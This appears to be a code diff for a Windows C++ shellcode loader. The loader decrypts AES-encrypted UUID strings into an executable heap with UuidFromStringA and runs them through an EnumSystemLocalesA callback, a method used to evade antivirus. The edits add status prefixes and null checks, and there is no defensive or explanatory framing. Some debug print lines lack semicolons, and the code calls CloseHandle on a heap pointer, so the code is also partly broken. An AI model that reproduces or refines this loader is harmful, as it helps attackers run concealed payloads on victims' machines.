@@ -4,7 +4,6 @@
 // ReSharper disable CppCStyleCast
 // ReSharper disable CppClangTidyClangDiagnosticCastQual
 #include <iostream>
-//#include <Rpc.h>
 #include <Windows.h>
 
 #include "aes.h"
@@ -13,7 +12,6 @@
 
 #include "CryptPayload.h"
 
-//#pragma comment(lib, "Rpcrt4.lib")
 #pragma comment(lib, "cryptlib")
 
 typedef RPC_STATUS(__stdcall* UA)(RPC_CSTR, UUID*);
@@ -29,7 +27,7 @@ int main()
         if (!fUuidFromStringA)
         {
 #ifdef _DEBUG
-        	printf("Unable to get proc address: UuidFromStringA")
+        	printf("[-] Unable to get proc address: UuidFromStringA\n")
 #endif
         	return -1;
         }            
@@ -37,14 +35,16 @@ int main()
     else
     {
 #ifdef _DEBUG
-        printf("Unable to load library: Rpcrt4.dll")
+        printf("[-] Unable to load library: Rpcrt4.dll\n")
 #endif
         return -1;
     }
         
 
 	HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
-    void* ha = HeapAlloc(hc, 0, 0x100000);
+    void* ha = nullptr;
+	if (hc)
+        ha = HeapAlloc(hc, 0, 0x100000);
     DWORD_PTR hptr = (DWORD_PTR)ha;
 	
     int elems = sizeof(encryptedUuids) / sizeof(encryptedUuids[0]);
@@ -66,13 +66,13 @@ int main()
         );
 
 #ifdef _DEBUG
-        printf("%s\n", recoveredUuid.c_str());
+        printf("[+] %s\n", recoveredUuid.c_str());
 #endif
     	
         RPC_STATUS status = fUuidFromStringA((RPC_CSTR)recoveredUuid.c_str(), (UUID*)hptr);
         if (status != RPC_S_OK) {
 #ifdef _DEBUG
-            printf("UuidFromStringA() != S_OK\n");
+            printf("[-] UuidFromStringA() != S_OK\n");
 #endif
             CloseHandle(ha);
 
@@ -88,7 +88,11 @@ int main()
     }
 #endif
 
-	EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
-    CloseHandle(ha);
-    return 0;
+	if (ha)
+	{
+        EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
+        CloseHandle(ha);
+        return 0;
+	}
+    return -2;
 }
